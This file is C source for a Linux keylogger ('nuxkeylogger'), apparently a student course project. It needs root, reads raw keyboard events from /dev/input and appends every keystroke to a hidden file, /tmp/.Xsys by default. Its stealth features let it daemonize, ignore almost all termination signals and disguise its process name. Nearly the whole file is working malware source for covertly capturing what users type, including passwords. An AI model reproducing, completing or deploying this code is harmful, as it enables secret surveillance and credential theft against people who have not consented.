//#!/usr/bin/python

/*
###############################
# Modulo captura   keylogger  #
# Proyecto de Modulo 4        #
#	 		      #
#      nmorales               #
#      varteaga               #
#      mvasquez               #
#			      #
############################### */



#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <getopt.h>
#include <string.h>
#include <signal.h>
#include <dirent.h>
#include <errno.h>
#include <linux/input.h>

/* duplicate string and exit program if fails */
#define XSTRDUP(p_cpy, str)        \
  do              \
    {              \
      p_cpy = strdup (str);        \
      if (!p_cpy)          \
  {              \
    fprintf (stderr, "strdup fails, memory exhausted\n");  \
    exit (EXIT_FAILURE);          \
  }              \
    }                \
  while (0)

#define XOPEN(fd, path, mode)        \
  do              \
    {              \
      fd = open (path, mode);        \
      if (fd == -1)          \
  fprintf (stderr, "open file \"%s\" error: %s\n",  \
     pathlog, strerror (errno));    \
    }              \
  while (0)

#define SET_KEY(buf, eve)      \
  if (eve.type == EV_KEY             \
      && (eve.value == 0      \
    || eve.value == 2))      \
    {            \
      buf = tab_key[eve.code - 1];

#define DEFAULT_PATH_LOG "/tmp/.Xsys"
#define PATH_KEYBOARD_FILE "/dev/input/by-path/"
#define VERSION_STR "nuxkeylogger v 0.0.1"

static struct option const long_options[] =
  {
    {"help", no_argument, 0, 'H'},
    {"version", no_argument, 0, 'V'},
    {"daemonize", no_argument, 0, 'd'},
    {"block-signals", no_argument, 0, 's'},
    {"mode-qwerty", no_argument, 0, 'Q'},
    {"mode-azerty", no_argument, 0, 'A'},
    {"hidden", required_argument, 0, 'i'},
    {"path-log", required_argument, 0, 'p'},
    {0, 0, 0, 0}
  };

static const char *tab_key_azerty[] =
  {
     "<ESC>", "&", "é", "\"", "'", "(", "-", "è", "_",
     "ç", "à", ")", "=", "<BACKSPACE>", "<TAB>", "a",
     "z", "e", "r", "t", "y", "u", "i", "o","p", "^",
     "$", "sup", "<CTRL>", "q", "s", "d", "f", "g", "h",
     "j", "k", "l", "m", "ù", "²", "<SHIFT>", "*", "w",
     "x", "c", "v", "b", "n", ",", ";", ":", "!", "<SHIFT>",
     "*", "<ALT>", " ", "", "<F1>", "<F2>", "<F4>",
     "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>", "",
     "<VerNum>", "", "7", "8", "9", "-", "4", "5", "6",
     "+", "1", "2", "3", "0", "<?>", "", "", "<", "<F11>",
     "<F12>", "", "", "", "", "", "", "", "", "", "/", "",
     "<ALTGr>", "", "", "<Up>", "<UP>", "<Left>", "<Right>",
     "<END>", "<Down>", "<DOWN>", "", "<DEL>", "", "", "",
     "", "", "", "", "", "", "", "", "", "", "<META>"
  };

static const char *tab_key_qwerty[] =
  {
    "<ESC>", "!", "@", "#", "$", "%", "^", "&", "*",
    "(", ")", "_", "=", "<BACKSPACE>", "<TAB>", "q",
    "w", "e", "r", "t", "y", "u", "i", "o", "p",
    "[", "]", "<ENTR>", "<CTRL-LEFT>", "a", "s", "d",
    "f", "g", "h", "j", "k", "l", ";", "'", "`", "",
    "\\", "z", "x", "c", "v", "b", "n", "m", ",", "",
    "", "", "", "ALT", " ", "", "<F1>", "<F2>", "<F3>",
    "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>",
    "", "", "7","8", "9", "-", "4", "5", "6", "+", "1", "2",
    "3", "0", ".", "", "", "<", "<F11>", "<F12>", "", "",
    "", "", "", "", "", "<ENTER-RIGHT>", "<CTRL-RIGHT>", "",
    "", "<AltGR>",  "", "", "<Up>", "", "<LEFT>", "", "<RIGHT>",
    "", "<DOWN>"
  };

void check_uid ();
void decode_opt (int argc, char **argv, char **path);
void hide_program (int argc, char **argv, const char *newname);
void daemonize_program (void);
void block_all_signal (void);
char * get_keyboard_path_file ();
int open_fd (char *pathlog, char *pathkey);
void start_key_loop (int fdlog, int fdkey);
void version (void);
void help (void);

char *program_name;
char **tab_key;

int
main (int argc, char **argv)
{
  char *pathlog = NULL;
  char *pathkey = NULL;

  program_name = argv[0];
  tab_key = NULL;
  check_uid ();
  if (argc != 1)
    decode_opt (argc, argv, &pathlog);
  pathkey = get_keyboard_path_file ();
  if (pathkey)
    open_fd (pathlog, pathkey);
  return 0;
}

void
check_uid ()
{
  if (getuid())
    {
      fprintf (stderr, "%s: not root user\n", program_name);
      exit (EXIT_FAILURE);
    }
}

void
decode_opt (int argc, char **argv, char **path)
{
  char opt;

  do
    {
      opt = getopt_long (argc, argv, "HVDdsAQi:p:", long_options, NULL);
      switch (opt)
  {
  case 'H':
    help ();
    break;
  case 'V':
    version ();
    break;
  case 'i':
    hide_program (argc, argv, argv[optind - 1]);
    break;
  case 'd':
    daemonize_program ();
    break;
  case 's':
    block_all_signal ();
    break;
  case 'Q':
    tab_key = (char **) tab_key_qwerty;
    break;
  case 'p':
    XSTRDUP (*path, optarg);
    break;
  }
    }
  while (opt != -1);
}

void
hide_program (int argc, char **argv, const char *name)
{
  char *newname;

  XSTRDUP (newname, name);
  do
    {
      argc--;
      memset (argv[argc], 0, strlen (argv[argc]));
    }
  while (argc);
  strcpy (argv[0], newname);
  free (newname);
  newname = NULL;
}

void
daemonize_program (void)
{
  pid_t pid;

  pid = fork ();
  if (pid == -1)
    {
      perror ("fork: ");
      exit (EXIT_FAILURE);
    }
  else if (pid)
    exit (EXIT_SUCCESS);
}

void
block_all_signal (void)
{
  int *p_sigl = NULL;
  static const int siglist[] =
    {
      SIGUSR1, SIGUSR2, SIGINT, SIGPIPE, SIGQUIT,
      SIGTERM, SIGTSTP, SIGHUP, SIGILL, SIGABRT,
      SIGFPE, SIGSEGV, SIGALRM, SIGCHLD, SIGCONT,
      SIGTTIN, SIGTTOU, 0
    };
  
  p_sigl = (int *) siglist;
  do
    signal (*p_sigl, SIG_IGN);
  while (*++p_sigl);
}

char *
get_keyboard_path_file ()
{
  int len;
  char *path = NULL;
  DIR *dir;
  struct dirent *ent = NULL;

  dir = opendir (PATH_KEYBOARD_FILE);
  if (!dir)
    {
      perror ("[opendir()] ");
      return  NULL;
    }
  do
    {
      ent = readdir (dir);
      if (!ent)
  break;
      if (strstr(ent->d_name, "-kbd"))
  {
    len = strlen (PATH_KEYBOARD_FILE) + strlen (ent->d_name) + 2;
    path = malloc (len * sizeof (char));
    if (!path)
      {
        fprintf (stderr, "malloc() fails...\n");
        exit (EXIT_FAILURE);
      }
    snprintf (path, len - 1, "%s%s", PATH_KEYBOARD_FILE, ent->d_name);
    *(path + len - 1) = '\0';
    break;
  }
    }
  while (1);
  closedir (dir);
  return path;
}


int
open_fd (char *pathlog, char *pathkey)
{
  int fdlog;
  int fdkey;

  if (pathlog)
    {
      XOPEN (fdlog, pathlog, O_CREAT| O_APPEND| O_WRONLY);
      free (pathlog);
    }
  else
    XOPEN (fdlog, DEFAULT_PATH_LOG, O_CREAT| O_APPEND| O_WRONLY);
  XOPEN (fdkey, pathkey, O_RDONLY);
  free (pathkey);
  if (fdlog == -1 || fdkey == -1)
    {
      close (fdlog);
      close (fdkey);
      return -1;
    }
  start_key_loop (fdlog, fdkey);
  close (fdlog);
  close (fdkey);
  return 0;
}

void
start_key_loop (int fdlog, int fdkey)
{
  const char *buf = NULL;
  struct input_event event;

  /* if tab_key not init, mode azerty chose by default,
     clean errno and start loop */
  if (!tab_key)
    tab_key = (char **) tab_key_azerty;
  errno = 0;
  while (1)
    {
      read(fdkey, &event, sizeof(struct input_event));
      /* if read fails, errno != 0 */
      if (errno)
  return;
      SET_KEY (buf, event)
    write (fdlog, buf, strlen (buf));
    /* if write fails, errno != 0 */
    if (errno)
      return;
  }
    }
}

void
version (void)
{
  puts (VERSION_STR);
  exit (EXIT_SUCCESS);
}

void
help (void)
{
  printf ("Warning, in \"qwerty\" mode, it's possibility to error key-mapp\n"
    "%s arguments list:\n\r"
    "   -H or --help                         : print usage\n\r"
    "   -V or --version                      : print program_version\r\n"
    "   -d or --daemonize                    : progam run in background\r\n"
    "   -s or --block-signal                 : block all signal\r\n"
    "   -Q or --mode-qwerty                  : keyboard in qwerty mode\r\n"
    "   -A or --mode-azerty                  : keyboard in azerty mode\r\n"
    "   -i or --hidden [NEW NAME]            : change program name\r\n"
    "   -p or --path-log [PATH]              : name for output log file\r\n",
    program_name);
  exit (EXIT_SUCCESS);
}
